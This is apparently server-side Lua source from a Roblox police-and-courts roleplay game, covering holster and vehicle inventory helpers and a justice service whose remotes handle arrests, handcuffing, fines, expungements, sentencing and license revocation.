		if PlayerCalled.Character:FindFirstChild("BaseDutyBelt") or PlayerCalled.Character:FindFirstChild("PAWDutyBelt") or PlayerCalled.Character:FindFirstChild("MSPBaseDutyBelt") then	
			for i,v in pairs(GetPlayerInventory(PlayerCalled)) do
				if Items[v[2]].Type == "Radio" then
					local RadioHolster = game.ReplicatedStorage.Holsters.Radio:Clone()
					RadioHolster.Parent = PlayerCalled.Character
				end	
			end
		end	
		for i,v in pairs(PlayerCalled.Backpack:GetChildren()) do
			if v:FindFirstChild("Class") then
				local Class = v.Class.Value
				local Holsters = game:GetService("ReplicatedStorage").Holsters
				local Items = require(game.ReplicatedStorage.Databases.Items)
				local Item = Items[Class]
				local ClassVest = {"ASPSVest","NerfNStrikeVest","Roblox Ninja Vest","NGWebbingVest","SOBVest","PoliceVest","SheriffVest","WarrantBureauVest","TrooperVest","PlymouthPlateVest","LanderPlateVest"}
				local ClassDuty = {"ASPSBelt","BaseDutyBelt","PAWDutyBelt","MSPBaseDutyBelt","MSPDutyBelt"}
				local Set = nil
				if Item.Holster then
					for i, HolsterSet in pairs(Item.Holster) do
						if HolsterSet[3] then
							if PlayerCalled.Character:FindFirstChild(HolsterSet[3]) then
								Set = {}
								for i, v in pairs(HolsterSet)
								do
									if not PlayerCalled.Character:FindFirstChild(v) then
										table.insert(Set, v)
									end
								end
							end
							if HolsterSet[3] == "Vest" then
								for i, v in pairs(ClassVest)
								do
									if PlayerCalled.Character:FindFirstChild(v) then	
										Set = {}
										for i, v in pairs(HolsterSet)
										do
											if not PlayerCalled.Character:FindFirstChild(v) then
												table.insert(Set, v)
											end
										end
									end
								end

							end
							if HolsterSet[3] == "DutyBelt" then
								for i, v in pairs(ClassDuty)
								do
									if PlayerCalled.Character:FindFirstChild(v) then	
										Set = {}
										for i, v in pairs(HolsterSet)
										do
											if not PlayerCalled.Character:FindFirstChild(v) then
												table.insert(Set, v)
											end
										end
									end
								end

							end
						else
							if Set == nil then
								Set = {}
								for i, v in pairs(HolsterSet)
								do
									if not PlayerCalled.Character:FindFirstChild(v) then
										table.insert(Set, v)
									end
								end
							end
						end
					end
				end
				if Set ~= nil then
					for i, v in pairs(Set) do
						if v ~= nil and v ~= false and v ~= "DutyBelt" and v ~= "BaseDutyBelt"  and v ~= "MSPDutyBelt" and v ~= "Vest" then
							local C = Holsters:FindFirstChild(v):Clone()
							C.Parent = PlayerCalled.Character
						end
					end
				end
			end
		end
	end)()
end



function GlassOk(seat)
	for _, g in pairs(seat.Parent.Parent.Body:GetChildren()) do
		if g:IsA("BasePart") and CollectionService:HasTag(g, "Glass") and not CollectionService:HasTag(g, "Ignore") then
			return
		end
	end
	return true
end

function round(n)
	return math.floor(n + 0.5)
end

local function GetTeamFromColor(brickColor)
	for i, v in pairs(Teams) do
		if v.TeamColor == brickColor then
			return i
		end
	end
end




local InventoryItems = {}

local function AddToCarInventory(Player, VehiclePlayer, Vehicle, Item, ItemId, CustomAttributes)
	local VehicleData = DataStore2(Vehicle.Name.."_VehicleData50", VehiclePlayer)
	local Inventory = VehicleData:GetTable({})
	local ItemData = Items[Item]
	local ItemAsset = Items[Item].Asset
	local ItemName = Items[Item].Name
	local ItemType = Items[Item].Type
	local Attributes = Items[Item].Attributes
	if Items[Item].NoDrop then
		return
	end
	local NewInventory = {}
	if ItemType == "Ploppable" or ItemType == "Radio" or Item == "HandcuffSet" then
		local Multiple = false
		local Found = false
		for i,v in pairs(Inventory) do
			if v[2] == Item then
				local currentTick = tick()
				local Id = Player.UserId.."_"..currentTick
				local One = v[1]
				local Tuu = v[2]
				local Tree = v[3]
				local Quantity = (v[3].Q+1)
				Tree.Q = Quantity
				Multiple = true
				local OldItem = {One,Tuu,{Q = Quantity}}
				table.remove(Inventory, i)
				table.insert(Inventory,OldItem)
				VehicleData:Set(Inventory)
				if Player ~= nil then
					FunctionService.RemoveItem(Player, ItemId, Inventory, Vehicle)
				end
				Found = true
				break
			end
		end
		if Found == false then
			local currentTick = tick()
			local Id = Player.UserId.."_"..currentTick
			local NewItem = {Id,ItemAsset, {Q = 1}}
			table.insert(Inventory,NewItem)
			VehicleData:Set(Inventory)
			if Player ~= nil then
				FunctionService.RemoveItem(Player, ItemId, Inventory, Vehicle)
			end
			return
		end
	else
		local currentTick = tick()
		local Id = Player.UserId.."_"..currentTick
		local NewItem = {Id, ItemAsset, CustomAttributes ~= nil and CustomAttributes or Attributes ~= nil and Attributes or {}}
		table.insert(Inventory,NewItem)
		VehicleData:Set(Inventory) 
		if Player ~= nil then
			FunctionService.RemoveItem(Player, ItemId, Inventory, Vehicle)	
		end
		return
	end
end




local function GetCarInventory(Player, Vehicle)
	local VehicleData = DataStore2(Vehicle.Name.."_VehicleData50", Player)
	local data = VehicleData:GetTable({})
	return data
end
local function CheckSpawnObstruction(SpawnPad, ignoreList)
	local function Cast(orig, endPos, ignore)
		return FindPartOnRayWithIgnoreList(workspace, RAY(orig, endPos - orig), ignore, false, true)
	end
	local RAY_LENGTH = 5
	local originPos = (SpawnPad.CFrame).p
	local endPos = (SpawnPad.CFrame * CFrame.new(0, 5, 0)).p
	local hit, pos, sur = Cast(originPos, endPos, ignoreList, RAY_LENGTH)
	if not hit then
		return true
	end
end
local function PlayerAvailableVehicles(plr, spawnset, bool)
	local v3 = { "SheriffConveyor", "PPDElDorado", "SheriffChariot", "PPDElDoradoSup", "SheriffChariotSup", "PPDJackal", "MSPJackal", "LPDJackal", "NGElDorado4x4", "DevConveyor", "SheriffJackal", "PWIntrepid", "UnmarkedJackal", "Hankmobile", "NGCrusader", "NGCrusaderMP", "MSPCrusader", "MSPCrusaderS", "LPDCrusader", "PPDCrusader", "SheriffCrusader", "SheriffCrusaderCS", "UnmarkedCrusader", "UnmarkedCrusaderC", "PPDCrusaderC", "SheriffCrusaderC", "LPDCrusaderCS", "LPDCrusaderC", "LPDCrusaderC", "MSPCrusaderC", "MSPCrusaderCS", "SheriffCrusaderC", "PWJackal", "NGCrusaderC", "NGCrusaderCMP", "MSPUtility", "LPDUtility" }
	local OwnedVehicles = DataStore2("OwnedVehicles12", plr)
	local RealOwnedVehicles = OwnedVehicles:GetTable({})
	local PlrOwnedVehicles = ShallowCopy(RealOwnedVehicles)
	local FinalOwned = {}
	local PlrRoles = require(game.ServerScriptService.Services.VerifyService).GetPlayerData(plr)

	for i,v in pairs(PlrRoles) do
		if v == 'MNGMP' then
			if plr.Team == game.Teams["Discarded National Guard"] then
				for _,veh in pairs(v.Permissions.CanSpawnVehicle) do
					table.insert(PlrOwnedVehicles,veh)
				end
			end
		end
	end
	for i,v in pairs(PlrRoles) do
		if v.Permissions ~= nil then
			if v.Permissions.CanSpawnVehicle ~= nil then
				for _,veh in pairs(v.Permissions.CanSpawnVehicle) do
					table.insert(PlrOwnedVehicles,veh)
				end
			end
		end
	end
	--for i,v in pairs(PlrRoles) do
	--	local Roledatabase = require(game.ReplicatedStorage.Databases.Roles)
	--	if v.Permissions ~= nil then
	--		if v.Permissions.CanSpawnVehicle ~= nil then
	--			for _,veh in pairs(v.Permissions.CanSpawnVehicle) do
	--				table.insert(PlrOwnedVehicles,veh)
	--			end
	--		end
	--	end
	--end
	if require(game.ReplicatedStorage.Databases.VehicleSpawns)[spawnset] ~= nil then
		for i,v in pairs(require(game.ReplicatedStorage.Databases.VehicleSpawns)[spawnset].Vehicles) do
			if table.find(PlrOwnedVehicles, v) then
				table.insert(FinalOwned, v)
			end
		end
		if plr.Team ~= game.Teams.Tourist and plr.Team ~= game.Teams.Citizen and plr.Team ~= game.Teams["County Government"] and plr.Team ~= game.Teams.LETI and plr.Team ~= game.Teams["State Government"] and plr.Team ~= game.Teams.Courts then
			if table.find(require(game.ReplicatedStorage.Databases.VehicleSpawns)[spawnset].Vehicles,'SheriffConveyor') or table.find(require(game.ReplicatedStorage.Databases.VehicleSpawns)[spawnset].Vehicles,'NHTALandCrawler') or table.find(require(game.ReplicatedStorage.Databases.VehicleSpawns)[spawnset].Vehicles,'PBSConveyor') or table.find(require(game.ReplicatedStorage.Databases.VehicleSpawns)[spawnset].Vehicles,'FireAmbulance') then
				for i,v in pairs(require(game.ReplicatedStorage.Databases.VehicleSpawns).PlymouthDealership.Vehicles) do
					if table.find(PlrOwnedVehicles, v) then
						table.insert(FinalOwned, v)
					end
				end
			end
		end
	end
	if plr.UserId == 204160865 then

	end
	if bool == true then
		return PlrOwnedVehicles
	else
		return FinalOwned	
	end
end

local ItemInventory = {}
local function ItemFind(ID)
	return ItemInventory[ID]
end


function Raycast(originPos, endPos, ignoreList, range)
	local directionVec = (endPos - originPos).unit
	return FindPartOnRayWithIgnoreList(workspace, RAY(originPos, directionVec * range), ignoreList, false, true)
end

local function DropRaycast(originPos, ignoreList)
	local hit, pos, sur = FindPartOnRayWithIgnoreList(workspace, RAY(originPos, V3(0, -8, 0)), ignoreList, false, true)
	return hit, pos, sur
end








FunctionService.Inventory = ItemFind
FunctionService.GiveItem = GiveItem
FunctionService.RemoveItem = RemoveItem
FunctionService.RemoveRadioHolster = RemoveRadioHolster
FunctionService.CloneRadioHolster = CloneRadioHolster
FunctionService.GetPlayerInventory = GetPlayerInventory
FunctionService.UpdatePlayerInventory = UpdatePlayerInventory
FunctionService.IgnoreDropList = IgnoreDropList
FunctionService.tagHumanoid = tagHumanoid
FunctionService.ItemDropSpawn = ItemDropSpawn
FunctionService.WearUniform = WearUniform
FunctionService.AddToCarInventory = AddToCarInventory
FunctionService.GetCarInventory = GetCarInventory
FunctionService.CheckSpawnObstruction = CheckSpawnObstruction
FunctionService.PlayerAvailableVehicles = PlayerAvailableVehicles
FunctionService.isSeated = isSeated
FunctionService.GetRecord = GetRecord
FunctionService.GetLicensePlate = GetLicensePlate
FunctionService.GetRoofTop = GetRoofTop
FunctionService.Logging = Logging
FunctionService.WearUni = WearUni
FunctionService.GetTeamFromColor = GetTeamFromColor
FunctionService.GetIgnoreList = GetIgnoreList
FunctionService.Raycast = Raycast
FunctionService.DropRaycast = DropRaycast
FunctionService.GlassOk = GlassOk
return FunctionService

services.justicesystem
local JusticeService = {} 
local Players = game:GetService("Players")
local Crimes = require(game:GetService("ReplicatedStorage").Databases.Crimes)
local DataStore2 = require(script.Parent.Parent.MainModule)
local Remotes = game.ReplicatedStorage.Remotes
local Items = require(game.ReplicatedStorage.Databases.Items)
local Tools = game.ServerStorage.Tools
local VerifyService = require(game.ServerScriptService.Services.VerifyService)
local FunctionService = require(game.ServerScriptService.Services.FunctionService)
local Util = require(game.ReplicatedStorage.Shared.Util)
local DataStoreService = game:GetService("DataStoreService")
local warrants = {}
local RemoteService = require(game.ServerScriptService.Services.RemoteService)
local Teams = require(game.ReplicatedStorage.Databases.Teams)

function RegisterRemote(name, callback)
	RemoteService.RegisterRemote(name, callback)
end
local function setPlayerData(userId, name, data)
	local orderedDataStore = DataStoreService:GetOrderedDataStore(name .. "/" .. userId)
	local dataStore = DataStoreService:GetDataStore(name .. "/" .. userId)

	local pages = orderedDataStore:GetSortedAsync(false, 1)
	local data = pages:GetCurrentPage()
	if data[1] ~= nil then
		dataStore:SetAsync(data[1].key + 1, data)
	end
end

local function getPlayerData(userId, name)
	local orderedDataStore = DataStoreService:GetOrderedDataStore(name .. "/" .. userId)
	local dataStore = DataStoreService:GetDataStore(name .. "/" .. userId)

	local pages = orderedDataStore:GetSortedAsync(false, 1)
	local data = pages:GetCurrentPage()
	if data[1] ~= nil then
		return dataStore:GetAsync(data[1])
	end
	return nil
end

RegisterRemote("FineAmount", function(Player)
	return VerifyService:GetData(Player).FineAmount
end)

RegisterRemote("Arrest", function(player, argPlayer, crimeId, reason)
	if not VerifyService.CheckPermission(player, "CanArrest") then return end
	local crimeTable = Crimes[crimeId]
	local releaseSeconds = crimeTable.Arrest * 60
	local releaseTime = os.time() + releaseSeconds
	local RecordsData = VerifyService:GetData(argPlayer).Records
	local reasonFilter = game:GetService("TextService"):FilterStringAsync(reason, player.UserId)
	local Filtered = reasonFilter:GetNonChatStringForBroadcastAsync()
	local PlayerArg = Players:FindFirstChild(argPlayer.Name)
	local Util = require(game.ReplicatedStorage.Shared.Util)
	if argPlayer:IsDescendantOf(Players) then
		if not (Util.GetDistanceBetweenPlayers(player, argPlayer) < 15) then
			Remotes.Notification:FireClient(player, "You were too far from the player being arrested.", "Unsuccessful Arrest!", "Red");
			return
		end
		if not player.Character:FindFirstChild("Grabbing") or not argPlayer.Character:FindFirstChild("Grabbed") or not game:GetService("ServerScriptService").Data:FindFirstChild(argPlayer.UserId .. "_HandcuffData") then
			return
		end
		table.insert(VerifyService:GetData(argPlayer).Records,
			{
				2, 
				os.time(), 
				player.UserId, 
				crimeId, 
				Filtered,
				releaseSeconds
			}
		)
		if game.Players:FindFirstChild(argPlayer.Name) then
			argPlayer.Team = game.Teams["Incarcerated"]
			wait(0.5)
			if game:GetService("ServerScriptService").Data:FindFirstChild(argPlayer.UserId .. "_HandcuffData") then
				game:GetService("ServerScriptService").Data:FindFirstChild(argPlayer.UserId .. "_HandcuffData"):Destroy()
			end
			Remotes.GetInv:FireClient(argPlayer,{})
			argPlayer:LoadCharacter()
		end
		game.ReplicatedStorage.Remotes.Notification:FireClient(player,'You arrested '..argPlayer.Name..' for '..Crimes[crimeId].Name,'Arrest Successful!')
		local jsonToSend = {
			embeds = {
				{
					title = "Log Event",
					type = "rich",
					description = player.Name.." has arrested "..argPlayer.Name.." for " ..Crimes[crimeId].Name.. " under reason " ..reason
				}
			}
		}

		require(game.ServerScriptService.Services.WebService).SendJSON("GodLog", jsonToSend)
		local timerConn
		local arrestCrime = RecordsData[#RecordsData]
		local crimeData = require(game.ReplicatedStorage.Databases.Crimes)[arrestCrime[4]]
		local releaseTime = (arrestCrime[2] + arrestCrime[6]) - os.time()
		if VerifyService:GetData(argPlayer).WarrantTable.Type then
			VerifyService:GetData(argPlayer).WarrantTable = {}
		end
		delay(releaseSeconds, function()
			if not Players:FindFirstChild(argPlayer.Name) then		
				return					 
			end
			argPlayer.TeamColor = Teams[require(game.ServerScriptService.Services.VerifyService):GetData(argPlayer).Team].TeamColor
			wait(0.5)
			Remotes.GetInv:FireClient(argPlayer,{})
			argPlayer:LoadCharacter()
			return
		end)
	else
		table.insert(VerifyService:GetData(argPlayer).Records,
			{
				2, 
				os.time(), 
				player.UserId, 
				crimeId, 
				Filtered,
				releaseSeconds
			}
		)
		game.ReplicatedStorage.Remotes.Notification:FireClient(player,'You arrested '..argPlayer.Name..' for '..Crimes[crimeId].Name,'Arrest Successful!')
		local jsonToSend = {
			embeds = {
				{
					title = "Log Event",
					type = "rich",
					description = player.Name.." has arrested "..argPlayer.Name.." for " ..Crimes[crimeId].Name.. " under reason " ..reason
				}
			}
		}

		require(game.ServerScriptService.Services.WebService).SendJSON("GodLog", jsonToSend)
	end
end)
RegisterRemote("Handcuff", function(CalledPlayer,ArgPlayer,Bool)
	if Players:FindFirstChild(ArgPlayer.Name) and not (Util.GetDistanceBetweenPlayers(CalledPlayer, ArgPlayer) < 15) then
		return
	end
	if (CalledPlayer.Character:FindFirstChild("HumanoidRootPart").Position - ArgPlayer.Character:FindFirstChild("HumanoidRootPart").Position).magnitude > 15 then return end

	if CalledPlayer ~= ArgPlayer and  VerifyService.CheckPermission(CalledPlayer, "CanCuff") and VerifyService.CheckPermission(CalledPlayer, "CanInteractTeams", FunctionService.GetTeamFromColor(ArgPlayer))then
		if Bool == true then

			local CuffValue = Instance.new("ObjectValue", game:GetService("ServerScriptService").Data)
			CuffValue.Name = ArgPlayer.UserId .. "_HandcuffData"
			CuffValue.Value = CalledPlayer
			local Name = "Handcuffs"
			local NewInventory = {}
			local Handcuffs = {Items.Handcuffs.Name,{Name,Name},true}
			table.insert(NewInventory,Handcuffs)
			local Model = Tools.Handcuffs:Clone()
			Model.Parent = ArgPlayer.Backpack
			Remotes.UpdateInv:FireClient(ArgPlayer,NewInventory)

		end
		if Bool == false then

			if ArgPlayer.Character:FindFirstChild("Grabbed") then
				ArgPlayer.Character.Grabbed.Value:FindFirstChild("Grabbing"):Destroy()
				ArgPlayer.Character.Grabbed:Destroy()
			end
			if game:GetService("ServerScriptService").Data:FindFirstChild(ArgPlayer.UserId .. "_HandcuffData") then
				game:GetService("ServerScriptService").Data:FindFirstChild(ArgPlayer.UserId .. "_HandcuffData"):Destroy()
			end
			local Name = "Handcuffs"
			local NewInventory = {}
			local Handcuffs = {Items.Handcuffs.Name,nil,false}
			table.insert(NewInventory,Handcuffs)
			Remotes.UpdateInv:FireClient(ArgPlayer,NewInventory)
			ArgPlayer.Character.Handcuffs:Destroy()

		end
	end
end)

RegisterRemote("Ruling", function(player, target, desc)
	if player.Team ~= game.Teams["Courts"] then return end
	if  VerifyService.CheckPermission(player, "CanRule") then
		Remotes.Notification:FireClient(player, "Your court ruling was successfully sent!", "Ruling Sent!", "Red");
		local jsonToSend = {
			embeds = { {
				type = "rich", 
				description = desc, 
				author = {
					name = player.Name
				}, 
				title = "Court Ruling"
			} }
		}
		require(game.ServerScriptService.Services.WebService).SendJSON("CourtRuling", jsonToSend)
	end;
end);
RegisterRemote("Expunge", function(player, argPlayerName, recordTime, recordOfficer)
	if not  VerifyService.CheckPermission(player, "CanExpunge") then
		warn("["..player.Name.."] Attempted to Expunge "..argPlayerName".")
		return
	end
	if player.Team ~= game.Teams["Courts"] then return end

	local userId = Players:GetUserIdFromNameAsync(argPlayerName)
	local Records = VerifyService:GetData(game.Players:FindFirstChild(argPlayerName)).Records

	for i,v in pairs(Records) do
		if v[2] == recordTime then
			if v[3] == recordOfficer then
				table.remove(VerifyService:GetData(game.Players:FindFirstChild(argPlayerName)).Records, i)
			end
		end

		game.ReplicatedStorage.Remotes.Notification:FireClient(player,'You expunged '..argPlayerName.."'s record of "..Crimes[v[4]].Name,'Expunge Success!')
		local jsonToSend = {
			embeds = {
				{
					title = "CourtLog Event",
					type = "rich",
					description = player.Name.." has expunged "..argPlayerName.."'s record of "..Crimes[v[4]].Name.."."
				}
			}
		}

		require(game.ServerScriptService.Services.WebService).SendJSON("ExpungeLog", jsonToSend)
	end
end)

local PlayerDataStore = DataStoreService:GetGlobalDataStore()
local SearchCooldown = {}

RegisterRemote("CrimeRecord", function(Player, Id, Value)
	local suc, err
	local Key = game.ServerScriptService.Services.RemoteService.Key.Value

	if game.Players:FindFirstChild(Value) then
		return VerifyService:GetData(game.Players:FindFirstChild(Value)).Records
	else
		local PlayerId
		suc, err = pcall(function()
			PlayerId = Players:GetUserIdFromNameAsync(Value)
		end)

		if suc then
			if SearchCooldown[Player.Name] ~= nil then
				if SearchCooldown[Player.Name][2] ~= nil then
					Remotes.Notification:FireClient(Player, "You cannot request the record of a player outside of the game more than 4 times a minute. Please try again later", "Search Unsuccessful", "Red")
					return
				end
			end
			if SearchCooldown[Player.Name] == nil then
				SearchCooldown[Player.Name] = {1, nil}
			else
				SearchCooldown[Player.Name][1] = SearchCooldown[Player.Name][1]+1
				if SearchCooldown[Player.Name][1] == 4 then
					SearchCooldown[Player.Name][1] = 0
					SearchCooldown[Player.Name][2] = 60
					delay(SearchCooldown[Player.Name][2], function()
						SearchCooldown[Player.Name][2] = nil
					end)
				end
			end

			local PlayerData = PlayerDataStore:GetAsync(PlayerId..Key)
			if PlayerData ~= nil then
				if #PlayerData.Records == 0 then
					Remotes.Notification:FireClient(Player, Value.." does not have a criminal record.", "Search Successful!")
				end 
				return PlayerData.Records
			else
				Remotes.Notification:FireClient(Player, Value.." does not have a criminal record.", "Search Successful!")
				return {}
			end
		else
			Remotes.Notification:FireClient(Player, "Invalid Username.", "Search Unsuccessful!")
			return {}
		end
	end
end)


RegisterRemote("Fine", function(player, argPlayer, crimeId, reason)
	if not VerifyService.CheckPermission(player, "CanFine") then
		warn("["..player.Name.."] Attempted to Fine.")
		return
	end

	local playerFinesData = VerifyService:GetData(player).FineAmount
	local crimeTable = Crimes[crimeId]
	local fineAmount = crimeTable.Fine + playerFinesData

	local reasonFilter = game:GetService("TextService"):FilterStringAsync(reason, player.UserId)
	local Filtered = reasonFilter:GetNonChatStringForBroadcastAsync()
	local util = require(game.ReplicatedStorage.Shared.Util)
	table.insert(VerifyService:GetData(argPlayer).Records,
		{
			0, 
			os.time(), 
			player.UserId, 
			crimeId, 
			Filtered
		}
	)
	if not (util.GetDistanceBetweenPlayers(player, argPlayer) < 15) then
		Remotes.Notification:FireClient(player, "You were too far from the player being cited.", "Unsuccessful Citation!", "Red");
		return
	end
	game.ReplicatedStorage.Remotes.Fine:FireClient(argPlayer, fineAmount)
	game.ReplicatedStorage.Remotes.Notification:FireClient(player,'You cited '..argPlayer.Name..' for '..Crimes[crimeId].Name,'Cited Successfully!')
	local jsonToSend = {
		embeds = {
			{
				title = "Log Event",
				type = "rich",
				description = player.Name.." has fined "..argPlayer.Name.." $"..fineAmount.." for "..crimeTable.Name.. " under reason " ..reason
			}
		}
	}

	require(game.ServerScriptService.Services.WebService).SendJSON("GodLog", jsonToSend)
	Remotes.Notification:FireClient(argPlayer, "You have been fined $"..fineAmount.." by "..player.Name.." for "..crimeTable.Name..". This fine needs to be paid within 30 minutes!", "Fined!", "Red", true)
end)

RegisterRemote("PayFine", function(player, interactId)
	local playerFinesData = VerifyService:GetData(player).FineAmount
	local Records = VerifyService:GetData(player).Records
	for i,v in pairs(Records) do
		if v[1] == 0 then
			table.remove(VerifyService:GetData(player).Records, i)
			local crimeTime = v[2]
			local crimeOfficer = v[3]
			local crimeId = v[4]
			local reason = v[5]
			table.insert(Records,
				{
					1, 
					crimeTime, 
					crimeOfficer, 
					crimeId, 
					reason
				}
			)
		end
	end

	local Bank = VerifyService:GetData(player).Bank
	local Cash = VerifyService:GetData(player).Cash
	local TotalAmount = Bank + Cash
	local AmountLeft = playerFinesData - Cash
	if Cash >= playerFinesData then
		VerifyService:GetData(player).Cash = Cash-playerFinesData
		playerFinesData = 0
		game.ReplicatedStorage.Remotes.Fine:FireClient(player, 0)

		game.ReplicatedStorage.Remotes.Notification:FireClient(player, "You have successfully paid all your fines.", "Fines Paid!")
	elseif Bank >= playerFinesData then
		VerifyService:GetData(player).Bank = Bank-playerFinesData
		playerFinesData = 0
		game.ReplicatedStorage.Remotes.Fine:FireClient(player, 0)

		game.ReplicatedStorage.Remotes.Notification:FireClient(player, "You have successfully paid all your fines.", "Fines Paid!")
	else
		game.ReplicatedStorage.Remotes.Notification:FireClient(player, "You don't have enough money to complete this transaction.", "Purchase Unsuccessful!", "Red")	
	end
	RemoteService.UpdateMoney(player)
end)

RegisterRemote("RevokeLicense", function(player, interactId, username)

	if not VerifyService.CheckPermission(player, "CanRevokeLicense") then return end

	local argPlayer = Players:GetUserIdFromNameAsync(username)
	if Players:FindFirstChild(username) then
		Remotes.Notification:FireClient(player, username.." has had their license revoked.", "Revoke Successful!")
		Remotes.Notification:FireClient(Players:FindFirstChild(username), "Your weapon license has been revoked.", "Revoked!", "Red")
		VerifyService:GetData(game.Players:FindFirstChild(username)).WeaponLicenseCooldown = (os.time() + 7200)
		VerifyService:GetData(game.Players:FindFirstChild(username)).WeaponLicense = false
		Remotes.RolesChanged:FireClient(game.Players:FindFirstChild(username), require(game.ServerScriptService.Services.VerifyService).GetPlayerData(game.Players:FindFirstChild(username)))
		for i,v in pairs(Players:FindFirstChild(username).Backpack:GetChildren()) do
			if v:IsA("Configuration") then
				if v:FindFirstChild("Class") then
					if v.Class.Value == "FOID" then
						require(game.ServerScriptService.Services:WaitForChild("FunctionService")).RemoveItem(Players:FindFirstChild(username), v.Name)
						local jsonToSend = {
							embeds = {
								{
									title = "Log Event",
									type = "rich",
									description = player.Name.." has revoked "..username.."'s license"
								}
							}
						}

						require(game.ServerScriptService.Services.WebService).SendJSON("RevokeLog", jsonToSend)
					end
				end
			end
		end
	else
		local PlayerDataStore = DataStoreService:GetGlobalDataStore()
		local GetPlayer = PlayerDataStore:GetAsync(player.UserId..game.ServerScriptService.Services.RemoteService.Key.Value)

		if GetPlayer.WeaponLicense then
			Remotes.Notification:FireClient(player, username.." has had their license revoked.", "Revoke Successful!")
			VerifyService:GetData(game.Players:FindFirstChild(username)).WeaponLicenseCooldown = (os.time() + 7200)
			local jsonToSend = {
				embeds = {
					{
						title = "Log Event",
						type = "rich",
						description = player.Name.." has revoked "..username.."'s license"
					}
				}
			}

			require(game.ServerScriptService.Services.WebService).SendJSON("RevokeLog", jsonToSend)
			GetPlayer.WeaponLicense = false
			PlayerDataStore:SetAsync(player.UserId..game.ServerScriptService.Services.RemoteService.Key.Value, GetPlayer)
		end
	end
end)

RegisterRemote("Sentence", function(player, interactId, optUsername, arrest, crimeId, reason, amountofTime)

	if not VerifyService.CheckPermission(player, "CanSentence") then return end

	if player.Team ~= game.Teams["Courts"] then return end
	if amountofTime == nil then return end

	if arrest == true then

		--print(optUsername)

		local argPlayer = game:GetService("Players"):GetUserIdFromNameAsync(optUsername)
		local crimeTable = Crimes[crimeId]
		local releaseSeconds = amountofTime * 60
		local releaseTime = os.time() + releaseSeconds
		local reasonFilter = game:GetService("TextService"):FilterStringAsync(reason, player.UserId)
		local Filtered = reasonFilter:GetNonChatStringForBroadcastAsync()
		table.insert(VerifyService:GetData(game.Players:FindFirstChild(optUsername)).Records,
			{
				2, 
				os.time(), 
				player.UserId, 
				crimeId, 
				Filtered,
				releaseSeconds
			}
		)
		if Players:FindFirstChild(optUsername) then
			Players:FindFirstChild(optUsername).Team = game.Teams["Incarcerated"]
			if VerifyService:GetData(Players:FindFirstChild(optUsername)).WarrantTable.Type then
				VerifyService:GetData(Players:FindFirstChild(optUsername)).WarrantTable = {}
			end
			delay(releaseSeconds, function()
				if not Players:FindFirstChild(optUsername) then		
					return					
				end
				game.Players:FindFirstChild(optUsername).TeamColor = require(game.ReplicatedStorage.Databases.Teams)[require(game.ServerScriptService.Services.VerifyService):GetData(game.Players:FindFirstChild(optUsername)).Team].TeamColor
				wait(0.5)
				Remotes.GetInv:FireClient(game.Players:FindFirstChild(optUsername),{})
				game.Players:FindFirstChild(optUsername):LoadCharacter()
			end)

			wait(0.5)
			if game:GetService("ServerScriptService").Data:FindFirstChild(argPlayer .. "_HandcuffData") then
				game:GetService("ServerScriptService").Data:FindFirstChild(argPlayer .. "_HandcuffData"):Destroy()
			end
			Remotes.GetInv:FireClient(Players:FindFirstChild(optUsername),{})
			Players:FindFirstChild(optUsername):LoadCharacter()
		end
		game.ReplicatedStorage.Remotes.Notification:FireClient(player,'You sentenced '..optUsername..' for '..Crimes[crimeId].Name,'Arrest Successful!')
		local jsonToSend = {
			embeds = {
				{
					title = "Log Event",
					type = "rich",
					description = player.Name.." has sentenced "..optUsername.." for " ..Crimes[crimeId].Name.. " under reason " ..reason
				}
			}
		}

		require(game.ServerScriptService.Services.WebService).SendJSON("CourtLog", jsonToSend)

	else
		local argPlayer = game:GetService("Players"):GetUserIdFromNameAsync(optUsername)
		local crimeTable = Crimes[crimeId]
		local fineAmount = crimeTable.Fine
		local reasonFilter = game:GetService("TextService"):FilterStringAsync(reason, player.UserId)
		local Filtered = reasonFilter:GetNonChatStringForBroadcastAsync()
		table.insert(VerifyService:GetData(game.Players:FindFirstChild(optUsername)).Records,
			{
				0, 
				os.time(), 
				player.UserId, 
				crimeId, 
				Filtered
			}
		)
		if Players:FindFirstChild(Players:GetNameFromUserIdAsync(argPlayer)) then 
			game.ReplicatedStorage.Remotes.Fine:FireClient(Players:FindFirstChild(Players:GetNameFromUserIdAsync(argPlayer)), fineAmount)
			Remotes.Notification:FireClient(Players:FindFirstChild(Players:GetNameFromUserIdAsync(argPlayer)), "You have been fined "..fineAmount.." by "..player.Name.." for "..crimeTable.Name..". This fine needs to be paid within 30 minutes!", "Fined!", "Red", true)
		end
		local jsonToSend = {
			embeds = {
				{
					title = "Log Event",
					type = "rich",
					description = player.Name.." has fined "..optUsername.." $"..fineAmount.." for "..crimeTable.Name.. " under reason " ..reason
				}
			}
		}

		require(game.ServerScriptService.Services.WebService).SendJSON("CourtLog", jsonToSend)
		game.ReplicatedStorage.Remotes.Notification:FireClient(player,'You cited '..optUsername..' for '..Crimes[crimeId].Name,'Cited Successfully!')
	end
end)



RegisterRemote("Grab", function(PlayerCalled,ArgPlayer,Bool)
	if PlayerCalled ~= ArgPlayer then

		if not VerifyService.CheckPermission(PlayerCalled, "CanArrest")  or not  VerifyService.CheckPermission(PlayerCalled, "CanCuff") or not VerifyService.CheckPermission(PlayerCalled, "CanInteractTeams", FunctionService.GetTeamFromColor(ArgPlayer)) then
			warn("["..PlayerCalled.Name.."] Attempted to Grab.")
			return
		end
		if Bool == true then

			if PlayerCalled.Character:FindFirstChild("Grabbing") then PlayerCalled.Character:FindFirstChild("Grabbing"):Destroy() end

			if (PlayerCalled.Character:FindFirstChild("HumanoidRootPart").Position - ArgPlayer.Character:FindFirstChild("HumanoidRootPart").Position).magnitude > 25 then return end

			local Grabbing = Instance.new("ObjectValue")
			Grabbing.Name = "Grabbing"
			Grabbing.Value = ArgPlayer.Character
			Grabbing.Parent = PlayerCalled.Character
			local Grabbed = Instance.new("ObjectValue")
			Grabbed.Name = "Grabbed"
			Grabbed.Value = PlayerCalled.Character
			Grabbed.Parent = ArgPlayer.Character
			return true
		end
		if Bool == false then
			PlayerCalled.Character:WaitForChild("Grabbing"):Destroy()
			ArgPlayer.Character:WaitForChild("Grabbed"):Destroy()
			return false
		end
	end
end)
RegisterRemote("SearchPermission", function(PlayerCalled,Status,ToPlayer,Ignored)
	if Ignored ~= false and ToPlayer then
		if Status == false then
			Remotes.SearchTools:FireClient(ToPlayer)
		else
			local Inventory =  FunctionService.GetPlayerInventory(PlayerCalled)
			Remotes.SearchTools:FireClient(ToPlayer,PlayerCalled,Inventory)
		end
	end
end)

